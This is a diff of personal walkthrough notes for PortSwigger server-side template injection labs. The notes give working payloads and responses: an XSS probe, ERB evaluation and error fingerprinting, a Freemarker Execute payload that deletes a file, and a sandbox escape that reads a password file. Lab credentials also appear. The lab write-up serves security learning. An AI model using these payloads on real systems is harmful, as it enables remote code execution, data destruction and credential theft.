@@ -14,45 +14,58 @@ https://portswigger.net/web-security/server-side-template-injection/exploiting/l
 
 To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 
 
-
 1. explore site. note that 
-    GET /product?productId=1 HTTP/1.1
+```
+GET /product?productId=1 HTTP/1.1
+```
 yeilds "out of stock messege", with redirection to:
-    GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1
+```
+GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1
+```
 
-2. check potential injection point
-
-check for reflection with **test** payload:
-    GET /?message=test HTTP/1.1
+2. check for reflection with **test** payload:
+GET /?message=test HTTP/1.1
 response:
-    HTTP/1.1 200 OK
-    
-    <div>test</div>
+```
+HTTP/1.1 200 OK
+
+<div>test</div>
+```
 
 test for XSS:
-    GET /?message=<script>alert(1)</script> HTTP/1.1
-response:
-    **we got am alert box! we have XSS!**
+```
+GET /?message=<script>alert(1)</script> HTTP/1.1
 
-it might be a simple XSS - test if it evaluate ERB executable math calculation:
-    GET /?message=<%=+7+*+7+%25> HTTP/1.1
+```
+response: **we got am alert box! we have XSS!**
+
+3. it might be a simple XSS - test if it evaluate ERB executable math calculation:
+```
+GET /?message=<%=+7+*+7+%25> HTTP/1.1
+```
 response:
-    HTTP/1.1 200 OK
-    
-    <div>49</div>
+```
+HTTP/1.1 200 OK
+
+<div>49</div>
+```
 
 since reflection yields the mat calculation rather than the string we can deduce it is **template injection** and not simple XSS
 
-3. investigate for build, and version by yielding an error message:
-    GET /?message=<%=foobar%> HTTP/1.1
+4. investigate for build, and version by yielding an error message:
+```
+GET /?message=<%=foobar%> HTTP/1.1
+```
 response:
-    <p class=is-warning>
-    (erb):1:in `&lt;main&gt;&apos;: undefined local variable or method `foobar&apos; for main:Object (NameError)
-	from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval&apos;
-	from /usr/lib/ruby/2.7.0/erb.rb:905:in `result&apos;
-	from -e:4:in `&lt;main&gt;&apos;</p>
+```
+<p class=is-warning>
+(erb):1:in `&lt;main&gt;&apos;: undefined local variable or method `foobar&apos; for main:Object (NameError)
+from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval&apos;
+from /usr/lib/ruby/2.7.0/erb.rb:905:in `result&apos;
+from -e:4:in `&lt;main&gt;&apos;</p>
+```
 
-we know we are dealing with Ruby-based ERB engine.
+***we know we are dealing with Ruby-based ERB engine.***
 <!-- (https://www.rubyguides.com/2018/11/ruby-erb-haml-slim/)
 This <%= %> tag will be replaced by the templating engine by evaluating the Ruby code inside it.
 Notice the equals sign in <%= %>. That tells ERB to render the contents of this tag.
@@ -211,7 +224,9 @@ try: <#assign ex = "freemarker.template.utility.Execute"?new()>${ex('id')}
 get: uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) 
 ``
 **final payload:**
-    <#assign ex = "freemarker.template.utility.Execute"?new()>${ex('rm /home/carlos/morale.txt')}
+```
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex('rm /home/carlos/morale.txt')}
+```
 
 # success!
 
@@ -404,3 +419,41 @@ This lab uses the Freemarker template engine. It is vulnerable to server-side te
 
 You can log in to your own account using the following credentials:
 content-manager:C0nt3ntM4n4g3r
+
+1. try using **Execute** to invoke action:
+try:
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex('cat /home/carlos/morale.txt')}
+get:
+FreeMarker template error: Instantiating freemarker.template.utility.Execute is not allowed in the template for security reasons. 
+
+**Execute** is fobidden
+
+2. find alternative way to execute (*from portswiggers solution:)
+try:
+```
+${object.getClass()}
+```
+get:
+```
+FreeMarker template error (..): The following has evaluated to null or missing: ==> object 
+```
+ther is access to 
+
+try:
+```
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+```
+get:
+```
+55 49 107 98 57 106 103 120 52 110 109 115 99 118 108 53 119 113 49 109 
+
+```
+encode to Ascii (easiet with CyberCheff: https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=NTUgNDkgMTA3IDk4IDU3IDEwNiAxMDMgMTIwIDUyIDExMCAxMDkgMTE1IDk5IDExOCAxMDggNTMgMTE5IDExMyA0OSAxMDk)
+
+Submit solution:
+71kb9jgx4nmscvl5wq1m
+
+# Lab solved
+
+payload analsys:
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
